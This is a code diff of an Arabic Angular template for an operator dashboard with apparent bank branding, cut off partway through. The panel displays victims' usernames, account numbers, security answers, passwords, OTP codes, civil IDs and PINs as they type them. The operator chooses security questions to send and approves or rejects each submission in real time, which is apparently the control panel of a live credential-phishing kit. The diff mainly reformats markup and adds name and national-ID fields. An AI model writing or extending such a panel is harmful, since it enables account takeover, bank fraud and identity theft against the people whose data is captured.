@@ -1,11 +1,14 @@
 <div class="min-h-screen w-full bg-slate-950 text-slate-100 flex flex-col font-sans" dir="rtl">
-  
+
   <!-- Navigation Header -->
-  <header class="w-full bg-slate-900/80 backdrop-blur-md border-b border-slate-800 sticky top-0 z-50 px-6 py-4 flex items-center justify-between">
+  <header
+    class="w-full bg-slate-900/80 backdrop-blur-md border-b border-slate-800 sticky top-0 z-50 px-6 py-4 flex items-center justify-between">
     <div class="flex items-center gap-3">
       <div class="w-10 h-10 rounded-xl bg-kfh-green flex items-center justify-center shadow-lg shadow-kfh-green/20">
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-          <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24"
+          stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
         </svg>
       </div>
       <div>
@@ -15,13 +18,12 @@
     </div>
 
     <!-- Logout -->
-    <button 
-      type="button" 
-      (click)="logout()"
-      class="border border-red-500/30 hover:border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2 rounded-xl text-sm font-semibold transition-all duration-200 cursor-pointer flex items-center gap-1.5"
-    >
-      <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-        <path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
+    <button type="button" (click)="logout()"
+      class="border border-red-500/30 hover:border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2 rounded-xl text-sm font-semibold transition-all duration-200 cursor-pointer flex items-center gap-1.5">
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"
+        stroke-width="2">
+        <path stroke-linecap="round" stroke-linejoin="round"
+          d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
       </svg>
       <span>تسجيل الخروج</span>
     </button>
@@ -38,295 +40,307 @@
 
     <!-- No attempts state -->
     @if (clients().length === 0) {
-      <div class="w-full py-24 bg-slate-900/40 border border-slate-800 rounded-3xl flex flex-col items-center justify-center text-center gap-4">
-        <div class="w-16 h-16 rounded-full bg-slate-800/80 flex items-center justify-center text-slate-500">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-            <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
-          </svg>
-        </div>
-        <div>
-          <h3 class="text-lg font-bold text-slate-300">لا توجد محاولات دخول نشطة حالياً</h3>
-          <p class="text-slate-500 text-sm mt-1">عندما يقوم العميل بإدخال بياناته في شاشة الدخول، ستظهر بطاقته هنا فوراً</p>
-        </div>
+    <div
+      class="w-full py-24 bg-slate-900/40 border border-slate-800 rounded-3xl flex flex-col items-center justify-center text-center gap-4">
+      <div class="w-16 h-16 rounded-full bg-slate-800/80 flex items-center justify-center text-slate-500">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"
+          stroke-width="1.5">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+          <path stroke-linecap="round" stroke-linejoin="round"
+            d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+        </svg>
       </div>
+      <div>
+        <h3 class="text-lg font-bold text-slate-300">لا توجد محاولات دخول نشطة حالياً</h3>
+        <p class="text-slate-500 text-sm mt-1">عندما يقوم العميل بإدخال بياناته في شاشة الدخول، ستظهر بطاقته هنا فوراً
+        </p>
+      </div>
+    </div>
     } @else {
-      <!-- Active clients list -->
-      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-        @for (client of clients(); track client.id) {
-          <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-lg flex flex-col justify-between gap-5 relative overflow-hidden transition-all duration-300 hover:border-slate-700/80">
-            
-            <!-- Glow Accent on Top -->
-            <div 
-              class="absolute top-0 right-0 left-0 h-1.5 transition-colors duration-300"
-              [class.bg-amber-500]="client.status === 'PENDING'"
-              [class.bg-blue-500]="client.status === 'WAITING_ANSWER' || client.status === 'PASSWORD_PENDING' || client.status === 'OTP_PENDING'"
-              [class.bg-purple-500]="client.status === 'ANSWERED'"
-              [class.bg-indigo-500]="client.status === 'PASSWORD_SUBMITTED'"
-              [class.bg-fuchsia-500]="client.status === 'RESET_SUBMITTED'"
-              [class.bg-emerald-500]="client.status === 'APPROVED'"
-              [class.bg-rose-500]="client.status === 'REJECTED'"
-            ></div>
+    <!-- Active clients list -->
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+      @for (client of clients(); track client.id) {
+      <div
+        class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-lg flex flex-col justify-between gap-5 relative overflow-hidden transition-all duration-300 hover:border-slate-700/80">
 
-            <!-- Client Info Header -->
-            <div class="flex items-start justify-between gap-2 mt-1">
-              <div class="flex items-center gap-3">
-                <div class="w-12 h-12 rounded-2xl bg-slate-850 flex items-center justify-center font-bold text-slate-200 border border-slate-800">
-                  {{ client.username[0] | uppercase }}
-                </div>
-                <div>
-                  <h4 class="font-bold text-white text-base leading-normal">{{ client.username }}</h4>
-                  <p class="text-xs text-slate-400 font-mono mt-0.5">حساب: {{ client.account_number }}</p>
-                </div>
-              </div>
-              
-              <!-- Badge -->
-              <span class="px-3 py-1 rounded-full text-xs font-bold border" [class]="getStatusBadgeClass(client.status)">
-                {{ getStatusText(client.status) }}
+        <!-- Glow Accent on Top -->
+        <div class="absolute top-0 right-0 left-0 h-1.5 transition-colors duration-300"
+          [class.bg-amber-500]="client.status === 'PENDING'"
+          [class.bg-blue-500]="client.status === 'WAITING_ANSWER' || client.status === 'PASSWORD_PENDING' || client.status === 'OTP_PENDING'"
+          [class.bg-purple-500]="client.status === 'ANSWERED'"
+          [class.bg-indigo-500]="client.status === 'PASSWORD_SUBMITTED'"
+          [class.bg-fuchsia-500]="client.status === 'RESET_SUBMITTED'"
+          [class.bg-emerald-500]="client.status === 'APPROVED'" [class.bg-rose-500]="client.status === 'REJECTED'">
+        </div>
+
+        <!-- Client Info Header -->
+        <div class="flex items-start justify-between gap-2 mt-1">
+          <div class="flex items-center gap-3">
+            <div
+              class="w-12 h-12 rounded-2xl bg-slate-850 flex items-center justify-center font-bold text-slate-200 border border-slate-800">
+              {{ (client.username || client.full_name || '?')[0] | uppercase }}
+            </div>
+            <div>
+              <h4 class="font-bold text-white text-base leading-normal">{{ client.username || client.full_name || 'عميل جديد' }}</h4>
+              @if (client.account_number) {
+                <p class="text-xs text-slate-400 font-mono mt-0.5">حساب: {{ client.account_number }}</p>
+              } @else if (client.national_id) {
+                <p class="text-xs text-slate-400 font-mono mt-0.5">الرقم الوطني: {{ client.national_id }}</p>
+              }
+            </div>
+          </div>
+
+          <!-- Badge -->
+          <span class="px-3 py-1 rounded-full text-xs font-bold border" [class]="getStatusBadgeClass(client.status)">
+            {{ getStatusText(client.status) }}
+          </span>
+        </div>
+
+        <!-- Client Action/State Details -->
+        <div class="flex-1 py-2 border-t border-b border-slate-850 my-1">
+
+          @if (client.full_name || client.national_id) {
+            <div class="bg-slate-950/35 border border-slate-850 rounded-xl p-2.5 mb-3 text-xs text-slate-400 flex flex-col gap-1">
+              @if (client.full_name) {
+                <span><strong>الاسم:</strong> {{ client.full_name }}</span>
+              }
+              @if (client.national_id) {
+                <span><strong>الرقم الوطني:</strong> {{ client.national_id }}</span>
+              }
+            </div>
+          }
+
+          <!-- State 1: PENDING (Choose Question) -->
+          @if (client.status === 'PENDING') {
+          <div class="flex flex-col gap-3">
+            <label class="text-xs font-semibold text-slate-400">اختر سؤال الأمان الذي سيظهر للعميل:</label>
+            <select [ngModel]="selectedQuestions()[client.id]" (ngModelChange)="onQuestionSelect(client.id, $event)"
+              class="w-full bg-slate-955 border border-slate-800 text-slate-200 py-3 px-3 rounded-xl focus:outline-none focus:border-kfh-green text-sm font-semibold select-none cursor-pointer">
+              @for (q of questionsList; track q) {
+              <option [value]="q">{{ q }}</option>
+              }
+            </select>
+            <app-button [loading]="actionLoading()[client.id] || false" (btnClick)="assignQuestion(client.id)"
+              customClasses="py-3 px-4 text-sm mt-1">
+              إرسال السؤال للعميل
+            </app-button>
+          </div>
+          }
+
+          <!-- State 2: WAITING_ANSWER -->
+          @if (client.status === 'WAITING_ANSWER') {
+          <div class="flex flex-col gap-2">
+            <div class="bg-slate-950/40 border border-slate-850 rounded-xl p-3">
+              <span class="text-xs text-slate-500 font-semibold block">السؤال النشط:</span>
+              <span class="text-slate-300 font-bold text-sm block mt-1">
+                {{ client.questions[client.questions.length - 1]?.question }}
+              </span>
+            </div>
+            <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
+              <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor"
+                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                </path>
+              </svg>
+              <span>في انتظار استلام إجابة العميل...</span>
+            </div>
+          </div>
+          }
+
+          <!-- State 3: ANSWERED (Review Answer) -->
+          @if (client.status === 'ANSWERED') {
+          <div class="flex flex-col gap-3.5">
+            <div class="bg-slate-950/40 border border-slate-850 rounded-xl p-3 flex flex-col gap-1">
+              <span class="text-xs text-slate-500 font-semibold">السؤال المرسل:</span>
+              <span class="text-slate-300 font-bold text-sm">
+                {{ client.questions[client.questions.length - 1]?.question }}
               </span>
             </div>
 
-            <!-- Client Action/State Details -->
-            <div class="flex-1 py-2 border-t border-b border-slate-850 my-1">
-              
-              <!-- State 1: PENDING (Choose Question) -->
-              @if (client.status === 'PENDING') {
-                <div class="flex flex-col gap-3">
-                  <label class="text-xs font-semibold text-slate-400">اختر سؤال الأمان الذي سيظهر للعميل:</label>
-                  <select 
-                    [ngModel]="selectedQuestions()[client.id]"
-                    (ngModelChange)="onQuestionSelect(client.id, $event)"
-                    class="w-full bg-slate-955 border border-slate-800 text-slate-200 py-3 px-3 rounded-xl focus:outline-none focus:border-kfh-green text-sm font-semibold select-none cursor-pointer"
-                  >
-                    @for (q of questionsList; track q) {
-                      <option [value]="q">{{ q }}</option>
-                    }
-                  </select>
-                  <app-button 
-                    [loading]="actionLoading()[client.id] || false"
-                    (btnClick)="assignQuestion(client.id)"
-                    customClasses="py-3 px-4 text-sm mt-1"
-                  >
-                    إرسال السؤال للعميل
-                  </app-button>
-                </div>
-              }
-
-              <!-- State 2: WAITING_ANSWER -->
-              @if (client.status === 'WAITING_ANSWER') {
-                <div class="flex flex-col gap-2">
-                  <div class="bg-slate-950/40 border border-slate-850 rounded-xl p-3">
-                    <span class="text-xs text-slate-500 font-semibold block">السؤال النشط:</span>
-                    <span class="text-slate-300 font-bold text-sm block mt-1">
-                      {{ client.questions[client.questions.length - 1]?.question }}
-                    </span>
-                  </div>
-                  <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
-                    <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    <span>في انتظار استلام إجابة العميل...</span>
-                  </div>
-                </div>
-              }
-
-              <!-- State 3: ANSWERED (Review Answer) -->
-              @if (client.status === 'ANSWERED') {
-                <div class="flex flex-col gap-3.5">
-                  <div class="bg-slate-950/40 border border-slate-850 rounded-xl p-3 flex flex-col gap-1">
-                    <span class="text-xs text-slate-500 font-semibold">السؤال المرسل:</span>
-                    <span class="text-slate-300 font-bold text-sm">
-                      {{ client.questions[client.questions.length - 1]?.question }}
-                    </span>
-                  </div>
-
-                  <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1">
-                    <span class="text-xs text-kfh-green font-semibold">إجابة العميل:</span>
-                    <span class="text-slate-900 font-extrabold text-lg">
-                      {{ client.questions[client.questions.length - 1]?.answer }}
-                    </span>
-                  </div>
-
-                  <div class="flex gap-3 mt-1">
-                    <app-button 
-                      [loading]="actionLoading()[client.id] || false"
-                      (btnClick)="verifyAnswer(client.id, true)"
-                      customClasses="py-2.5 text-sm font-bold flex-1"
-                    >
-                      قبول الدخول
-                    </app-button>
-                    <button 
-                      type="button"
-                      [disabled]="actionLoading()[client.id]"
-                      (click)="verifyAnswer(client.id, false)"
-                      class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      رفض الإجابة
-                    </button>
-                  </div>
-                </div>
-              }
-
-              <!-- State 4: APPROVED -->
-              @if (client.status === 'APPROVED') {
-                <div class="flex flex-col gap-2">
-                  <div class="bg-slate-950/20 rounded-xl p-2.5 text-xs text-slate-400">
-                    <span class="font-semibold block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
-                    <span class="font-semibold block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
-                    @if (client.password) {
-                      <span class="font-semibold block mt-1">كلمة السر: {{ client.password }}</span>
-                    }
-                    @if (client.otp) {
-                      <span class="font-semibold block mt-1">رمز OTP: {{ client.otp }}</span>
-                    }
-                  </div>
-                  <div class="bg-emerald-950/30 border border-emerald-800 rounded-xl p-3.5 flex items-center gap-2 text-emerald-400 mt-1">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
-                      <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
-                    </svg>
-                    <span class="text-sm font-bold">تم التحقق والموافقة بنجاح</span>
-                  </div>
-                </div>
-              }
-
-              <!-- State 5: REJECTED -->
-              @if (client.status === 'REJECTED') {
-                <div class="flex flex-col gap-2">
-                  <div class="bg-slate-950/20 rounded-xl p-2.5 text-xs text-slate-400">
-                    <span class="font-semibold block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
-                    <span class="font-semibold block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
-                    @if (client.password) {
-                      <span class="font-semibold block mt-1">كلمة السر: {{ client.password }}</span>
-                    }
-                  </div>
-                  <div class="bg-rose-950/30 border border-rose-800 rounded-xl p-3.5 flex items-center gap-2 text-rose-400 mt-1">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20" fill="currentColor">
-                      <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
-                    </svg>
-                    <span class="text-sm font-bold">تم رفض الطلب وإلغاء الجلسة</span>
-                  </div>
-                </div>
-              }
-
-              <!-- State 6: PASSWORD_PENDING -->
-              @if (client.status === 'PASSWORD_PENDING') {
-                <div class="flex flex-col gap-2">
-                  <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-450 border border-slate-900">
-                    <span class="block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
-                    <span class="block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
-                  </div>
-                  <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
-                    <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    <span>في انتظار قيام العميل بإدخال كلمة السر...</span>
-                  </div>
-                </div>
-              }
-
-              <!-- State 7: PASSWORD_SUBMITTED -->
-              @if (client.status === 'PASSWORD_SUBMITTED') {
-                <div class="flex flex-col gap-3.5">
-                  <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-400 border border-slate-900">
-                    <span class="block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
-                    <span class="block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
-                  </div>
-
-                  <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1">
-                    <span class="text-xs text-kfh-green font-semibold">كلمة السر المدخلة:</span>
-                    <span class="text-slate-900 font-extrabold text-lg">
-                      {{ client.password }}
-                    </span>
-                  </div>
-
-                  <div class="flex gap-3 mt-1">
-                    <app-button 
-                      [loading]="actionLoading()[client.id] || false"
-                      (btnClick)="verifyAnswer(client.id, true)"
-                      customClasses="py-2.5 text-sm font-bold flex-1"
-                    >
-                      قبول كلمة السر
-                    </app-button>
-                    <button 
-                      type="button"
-                      [disabled]="actionLoading()[client.id]"
-                      (click)="verifyAnswer(client.id, false)"
-                      class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      رفض كلمة السر
-                    </button>
-                  </div>
-                </div>
-              }
-
-              <!-- State 8: OTP_PENDING -->
-              @if (client.status === 'OTP_PENDING') {
-                <div class="flex flex-col gap-2">
-                  <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-405 border border-slate-900">
-                    <span class="block">كلمة السر المقبولة: {{ client.password }}</span>
-                  </div>
-                  <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
-                    <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    <span>في انتظار قيام العميل بإدخال رمز OTP...</span>
-                  </div>
-                </div>
-              }
-
-              <!-- State 9: RESET_SUBMITTED (Review Reset Request) -->
-              @if (client.status === 'RESET_SUBMITTED') {
-                <div class="flex flex-col gap-3.5">
-                  <div class="bg-slate-950/25 border border-slate-900 rounded-xl p-3 flex flex-col gap-1.5 text-xs text-slate-350">
-                    <span class="font-bold text-slate-400 border-b border-slate-800 pb-1 mb-1 block">بيانات إعادة تعيين الحساب:</span>
-                    <span class="block"><strong class="text-slate-500">اسم المستخدم:</strong> {{ client.username }}</span>
-                    <span class="block"><strong class="text-slate-500">رقم الحساب:</strong> {{ client.account_number }}</span>
-                  </div>
-
-                  <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1.5">
-                    <span class="text-xs text-kfh-green font-semibold">البيانات المدخلة للتحقق:</span>
-                    <span class="block text-slate-800 text-sm font-bold mt-0.5">
-                      <strong class="text-slate-500 text-xs font-semibold">الرقم المدني:</strong> {{ client.civil_id }}
-                    </span>
-                    <span class="block text-slate-800 text-sm font-bold">
-                      <strong class="text-slate-500 text-xs font-semibold">الرقم السري:</strong> {{ client.pin }}
-                    </span>
-                  </div>
-
-                  <div class="flex gap-3 mt-1">
-                    <app-button 
-                      [loading]="actionLoading()[client.id] || false"
-                      (btnClick)="verifyAnswer(client.id, true)"
-                      customClasses="py-2.5 text-sm font-bold flex-1"
-                    >
-                      قبول الطلب
-                    </app-button>
-                    <button 
-                      type="button"
-                      [disabled]="actionLoading()[client.id]"
-                      (click)="verifyAnswer(client.id, false)"
-                      class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
-                    >
-                      رفض الطلب
-                    </button>
-                  </div>
-                </div>
-              }
-
+            <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1">
+              <span class="text-xs text-kfh-green font-semibold">إجابة العميل:</span>
+              <span class="text-slate-900 font-extrabold text-lg">
+                {{ client.questions[client.questions.length - 1]?.answer }}
+              </span>
             </div>
 
-            <!-- Footer timestamp -->
-            <div class="flex items-center justify-between text-slate-500 text-xs">
-              <span>بدء الطلب:</span>
-              <span>{{ client.created_at | date:'shortTime' }}</span>
+            <div class="flex gap-3 mt-1">
+              <app-button [loading]="actionLoading()[client.id] || false" (btnClick)="verifyAnswer(client.id, true)"
+                customClasses="py-2.5 text-sm font-bold flex-1">
+                قبول الدخول
+              </app-button>
+              <button type="button" [disabled]="actionLoading()[client.id]" (click)="verifyAnswer(client.id, false)"
+                class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed">
+                رفض الإجابة
+              </button>
             </div>
-
           </div>
-        }
+          }
+
+          <!-- State 4: APPROVED -->
+          @if (client.status === 'APPROVED') {
+          <div class="flex flex-col gap-2">
+            <div class="bg-slate-950/20 rounded-xl p-2.5 text-xs text-slate-400">
+              <span class="font-semibold block">السؤال: {{ client.questions[client.questions.length - 1]?.question
+                }}</span>
+              <span class="font-semibold block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer
+                }}</span>
+              @if (client.password) {
+              <span class="font-semibold block mt-1">كلمة السر: {{ client.password }}</span>
+              }
+              @if (client.otp) {
+              <span class="font-semibold block mt-1">رمز OTP: {{ client.otp }}</span>
+              }
+            </div>
+            <div
+              class="bg-emerald-950/30 border border-emerald-800 rounded-xl p-3.5 flex items-center gap-2 text-emerald-400 mt-1">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20"
+                fill="currentColor">
+                <path fill-rule="evenodd"
+                  d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                  clip-rule="evenodd" />
+              </svg>
+              <span class="text-sm font-bold">تم التحقق والموافقة بنجاح</span>
+            </div>
+          </div>
+          }
+
+          <!-- State 5: REJECTED -->
+          @if (client.status === 'REJECTED') {
+          <div class="flex flex-col gap-2">
+            <div class="bg-slate-950/20 rounded-xl p-2.5 text-xs text-slate-400">
+              <span class="font-semibold block">السؤال: {{ client.questions[client.questions.length - 1]?.question
+                }}</span>
+              <span class="font-semibold block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer
+                }}</span>
+              @if (client.password) {
+              <span class="font-semibold block mt-1">كلمة السر: {{ client.password }}</span>
+              }
+            </div>
+            <div
+              class="bg-rose-950/30 border border-rose-800 rounded-xl p-3.5 flex items-center gap-2 text-rose-400 mt-1">
+              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 flex-shrink-0" viewBox="0 0 20 20"
+                fill="currentColor">
+                <path fill-rule="evenodd"
+                  d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
+                  clip-rule="evenodd" />
+              </svg>
+              <span class="text-sm font-bold">تم رفض الطلب وإلغاء الجلسة</span>
+            </div>
+          </div>
+          }
+
+          <!-- State 6: PASSWORD_PENDING -->
+          @if (client.status === 'PASSWORD_PENDING') {
+          <div class="flex flex-col gap-2">
+            <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-450 border border-slate-900">
+              <span class="block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
+              <span class="block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
+            </div>
+            <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
+              <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor"
+                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                </path>
+              </svg>
+              <span>في انتظار قيام العميل بإدخال كلمة السر...</span>
+            </div>
+          </div>
+          }
+
+          <!-- State 7: PASSWORD_SUBMITTED -->
+          @if (client.status === 'PASSWORD_SUBMITTED') {
+          <div class="flex flex-col gap-3.5">
+            <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-400 border border-slate-900">
+              <span class="block">السؤال: {{ client.questions[client.questions.length - 1]?.question }}</span>
+              <span class="block mt-1">الإجابة: {{ client.questions[client.questions.length - 1]?.answer }}</span>
+            </div>
+
+            <div class="bg-kfh-green-light border border-kfh-green/20 rounded-xl p-3 flex flex-col gap-1">
+              <span class="text-xs text-kfh-green font-semibold">كلمة السر المدخلة:</span>
+              <span class="text-slate-900 font-extrabold text-lg">
+                {{ client.password }}
+              </span>
+            </div>
+
+            <div class="flex gap-3 mt-1">
+              <app-button [loading]="actionLoading()[client.id] || false" (btnClick)="verifyAnswer(client.id, true)"
+                customClasses="py-2.5 text-sm font-bold flex-1">
+                قبول كلمة السر
+              </app-button>
+              <button type="button" [disabled]="actionLoading()[client.id]" (click)="verifyAnswer(client.id, false)"
+                class="border border-red-500 text-red-400 hover:bg-red-500/10 px-4 py-2.5 rounded-xl text-sm font-bold flex-1 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed">
+                رفض كلمة السر
+              </button>
+            </div>
+          </div>
+          }
+
+          <!-- State 8: OTP_PENDING -->
+          @if (client.status === 'OTP_PENDING') {
+          <div class="flex flex-col gap-2">
+            <div class="bg-slate-950/25 rounded-xl p-3 text-xs text-slate-405 border border-slate-900">
+              <span class="block">كلمة السر المقبولة: {{ client.password }}</span>
+            </div>
+            <div class="flex items-center gap-2 text-blue-400 mt-2 text-sm justify-center py-2 animate-pulse">
+              <svg class="animate-spin h-4 w-4" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor"
+                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+                </path>
+              </svg>
+              <span>في انتظار قيام العميل بإدخال رمز OTP...</span>
+            </div>
+          </div>
+          }
+
+          <!-- State 9: RESET_SUBMITTED (Review Reset Request) -->
+          @if (client.status === 'RESET_SUBMITTED') {
+          <div class="flex flex-col gap-3.5">
+            <div
+              class="bg-slate-950/25 border border-slate-900 rounded-xl p-3 flex flex-col gap-1.5 text-xs text-slate-350">
+              <span class="font-bold text-slate-400 border-b border-slate-800 pb-1 mb-1 block">بيانات إعادة تعيين
+                الحساب:</span>
+              <span class="block"><strong class="text-slate-500">اسم المستخدم:</strong> {{ client.username }}</span>
